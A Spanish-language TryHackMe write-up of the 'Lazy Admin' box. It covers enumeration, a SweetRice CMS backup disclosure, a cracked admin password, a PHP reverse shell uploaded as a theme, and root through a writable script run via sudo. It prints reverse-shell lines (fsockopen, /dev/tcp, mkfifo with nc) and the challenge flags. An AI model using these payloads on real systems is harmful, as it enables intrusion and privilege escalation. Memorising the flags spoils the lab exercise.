# Lazy Admin

### tags: `Try Hack Me` `Linux` `SweetRice` `sudo` `Shell Reversa`

## **FLAGS:**

* User Flag: THM{63e5bce9271952aad1113b6f1ac28a07}
* Root Flag: THM{6637f41d0177b6f37cb20d775124699f}

## **USERS:**

* manager \(pwd: Password123\)
* itguy

## **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO \(**Linux**: TTL &lt;= 64\) `ping -c1 IP`

   ![](https://i.imgur.com/EL1AuIt.png)

2. Escaneamos los puertos abiertos
   * Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

     ```text
       -p-        Todos los puertos
       --open     Mostrar solos puertos abiertos
       -T5        Modo más agresivo
       -v         Modo verbose (reporta por pantalla)
       -n        No aplicar resolución DNS
     ```

   * Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

     ```text
       -sS        Realizar un TCP SYN port scan
       --min-rate    Emitir al menos 5000 paquetes por segundo
       -Pn        No realizar Host Discovery
     ```

     * Va más rápido y encuentra los puertos 22 \(SSH\) y 80 \(HTTP\)

       ![](https://i.imgur.com/riUuYVR.png)
3. Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80 IP`

   ![](https://i.imgur.com/XGjH6iT.png)

4. Nos centramos en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

   ![](https://i.imgur.com/29XDqAn.png)

5. Accedemos al portal web y vemos lo mismo con Wappalyzer. El portal es la página por defecto de apache.
6. Vamos a hacer un fuzzing en el portal para encontrar alguna ruta con un script de enumeración de NMAP

   `nmap -sV --script=http-enum IP`

   ![](https://i.imgur.com/wjHhlOW.png)

   * Hacemos el fuzz también con GoBuster, ya que lo pide como pregunta básica `gobuster dir -u IP -w DICT -q -n -e`

     ```text
       -u        Target 
       -w         Diccionario (/usr/share/wordlists/dirb/common.txt)
       -q        Silencioso, no muestra mensajes de estado           
       -n        No muestra códigos de estado        
       -e        Muestra URLs completas
     ```

     ![](https://i.imgur.com/MhZcP4W.png)

7. Hay un posible path interesante **/content/**. Accedemos a el:

   ![](https://i.imgur.com/P79kkt9.png)

   * Vemos lo que parece ser un CMS **SweetRice**. Repetimos los pasos anteriores sobre /content:
   * `whatweb IP/content` - Nada interesante

     ![](https://i.imgur.com/nhTLV3D.png)

   * `gobuster dir -u IP/content -w DICT -q -n -e`

     ![](https://i.imgur.com/WiMhs4f.png)

   * Aquí si que parece haber más. Accedemos a cada path a ver que hay.
     * /as es un portal de login

       ![](https://i.imgur.com/xcJJUrV.png)

     * /images y /js tienen estáticos. En /js vemos un sweetrice.js, intentamos sacar la versión pero no podemos.
     * /attachments esta vacía, pero parece el directorio donde se suben ficheros.
     * /inc tiene todos los ficheros PHP del CMS

## **SWEET RICE CMS**

1. Buscamos exploits para este CMS. No conocemos la versión.

   ![](https://i.imgur.com/y5ANkMg.png)

   * Intentamos el de subida de ficheros para 1.5.1, pero vemos que necesitamos logearnos. Tiramos por el de Backup Disclosure.

     ![](https://i.imgur.com/QLZxrPz.png)

   * Nos dice que podemos descargar los backups de MySQL y del CMS. Es cierto:

     ![](https://i.imgur.com/bpob5T9.png)

2. Es un backup con las sentencias SQL en PHP para restaurar la base de datos. Vemos la siguiente tabla:

   ![](https://i.imgur.com/xWunKxi.png)

   * Vemos un insert para esa tabla:

     ![](https://i.imgur.com/4KePggg.png)

   * La fila content contiene un objeto serializado con muchos datos, parece incluir una password. Nos quedamos con los siguientes datos:

     ![](https://i.imgur.com/TxbQhby.png)

   * Al pasar el hash que parece un password por Crackstation, vemos la password real.

     ![](https://i.imgur.com/OLvfPzz.png)

     Tenemos un usuario: **manager** Tenemos la password de manager: **Password123**

3. Nos logueamos en el portal con estas credenciales. Vemos un panel de administración.

   ![](https://i.imgur.com/l1fmHHq.png)

4. Hemos visto antes un exploit para la subida de ficheros, pero vamos a hacerlo manualmente a través del tema. En el panel de Theme, podemos modificar o crear nuevos temas.
   * Subimos un fichero zip **test.zip** que dentro contiene un fichero **test.php** con un echo. Vamos a la ruta **IP/content/\_themes** y vemos la carpeta test y dentro el fichero. Lo abrimos y carga el echo:

     ![](https://i.imgur.com/v4sS7V3.png)

     ![](https://i.imgur.com/QudtPs2.png)

## **GET A SHELL**

Vamos a acceder con shell reversa. Usamos [este Cheat-Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

* Creamos un script en PHP con lo siguiente y lo metemos en un zip:

  `$sock = fsockopen($ip,$port);`

  `$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);`

  ![](https://i.imgur.com/XNssWtS.png)

* Subimos el ZIP como tema al servidor

  ![](https://i.imgur.com/jx44jLz.png)

* Levantamos un puerto en escucha en nuestro Kali:

  `nc -lvp 8443`

* Accedemos al fichero shell.php y conseguimos una Shell en el servidor como el usuario www-data.

  ![](https://i.imgur.com/4BGI6hs.png)

* Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa: 1. python -c 'import pty; pty.spawn\("/bin/bash"\)' 2. script /dev/null -c bash 3. CTRL + Z 4. stty raw -echo 5. fg 6. reset 7. xterm 8. export TERM=xterm 9. export SHELL=bash 10. stty -a 11. stty rows _NumRows_ columns _NumCols_

  ```text
  _Obtenemos NumRows y NumCols con stty -a en otra terminal con la misma dimensión que la shell reversa_
  ```

## **USER FLAG**

Intentamos encontrar la flag user.txt

`find / -type f -name user.txt 2> /dev/null`

![](https://i.imgur.com/tQEk6tJ.png)

En el directorio, vemos que tenemos permisos y vemos la flag:

![](https://i.imgur.com/HNnr6dd.png)

Tenemos la user flag: **THM{63e5bce9271952aad1113b6f1ac28a07}**

## **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4). También podemos lanzar este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema.

1. En primer lugar, intentamos ver los privilegios de sudo del usuario www-data con `sudo -l`.

   ![](https://i.imgur.com/dTXCc4d.png)

2. Vemos que puede ejecutar el comando perl sobre el fichero backup.pl sin password como sudo.
   * Si intentamos esto no funciona, ya que no tiene permisos sobre todo perl, solo sobre el script **backup.pl**.

     ![](https://i.imgur.com/sVor33Q.png)

     ![](https://i.imgur.com/95AgtYp.png)

   * Si miramos el script backup.pl, vemos que lanza otro script **/etc/copy.sh**, sobre el cual tenemos permisos de escritura:

     ![](https://i.imgur.com/Zz4riDb.png)
3. Modificamos el script **/etc/copy.sh** para que levante una shell reversa con el siguiente contenido:

   `/bin/bash -l > /dev/tcp/MY_IP/8888 0<&1 2>&1`

4. Levantamos el puerto 8888 en escucha y lanzamos el script de perl con sudo:

   ![](https://i.imgur.com/IYXzjTy.png)

   * No funciona el /dev/tcp. Como hemos visto, el contenido que habia en /etc/copy.sh incluía un nc, así que parece instalado.

5. El comando que tenía el script ya era una shell reversa. Cambiamos solo la IP y el puerto:

   `rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc IP 8888 > /tmp/f`

   ![](https://i.imgur.com/IsNz8mR.png)

6. Hemos escalado privilegios. Vamos al directorio /root a por la 2a Flag.

   Tenemos la root flag: **THM{6637f41d0177b6f37cb20d775124699f}**

